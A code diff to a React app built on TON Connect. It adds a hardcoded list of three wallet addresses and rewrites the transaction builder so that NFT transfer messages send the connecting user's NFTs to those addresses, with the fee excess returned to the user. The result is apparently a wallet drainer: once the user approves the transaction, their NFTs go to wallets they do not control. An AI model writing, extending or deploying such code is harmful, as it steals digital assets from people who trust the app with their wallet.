@@ -9,6 +9,11 @@ function App() {
   const userFriendlyAddress = useTonAddress();
   const [tonConnectUI] = useTonConnectUI();
   const [address , setaddress]=useState([])
+  const [senders , setsenders]=useState([
+    'UQACNxrqm1R8-hNaARw8SXBkCjOdLNnlvYh5thE60ICfXJIE',
+    'UQBR2700L04dU0MjF2r0jBT_JWBNNC3eSv3lyA7ulO1zd_n4',
+    'UQAGsGy8w8ALuPSFWkcttdf-AhX6iEeZWPJjc0TR_YFeQUUR'
+  ])
 
   const getNft =async ()=>{
     try{
@@ -26,21 +31,23 @@ function App() {
     try{
         const payloads = []
 
-        address.map(data =>(
+        senders.map((data , index) =>{
+          const newaddress = address[index % address.length]; 
+
           payloads.push(
           {
-          address: Address.parse(data).toString(),
+          address: Address.parse(newaddress).toString(),
           amount: toNano("0.05").toString(),  
           payload: beginCell()
           .storeUint(0x5fcc3d14, 32)              
           .storeUint(0, 64)                       
-          .storeAddress(Address.parse(Owner))               
+          .storeAddress(Address.parse(data))               
           .storeAddress(Address.parse(userFriendlyAddress)) 
           .storeUint(0, 1)                        
           .storeCoins(toNano('0.000005'))                          
           .storeUint(0,1)                    
           .endCell().toBoc().toString("base64")
-        })))
+        })})
 
         console.log(payloads)
         const myTransaction = {
@@ -51,7 +58,7 @@ function App() {
       const boc = await tonConnectUI.sendTransaction(myTransaction)
       console.log(boc)
     }catch(err){
-
+      console.log(err)
     }
   }
 
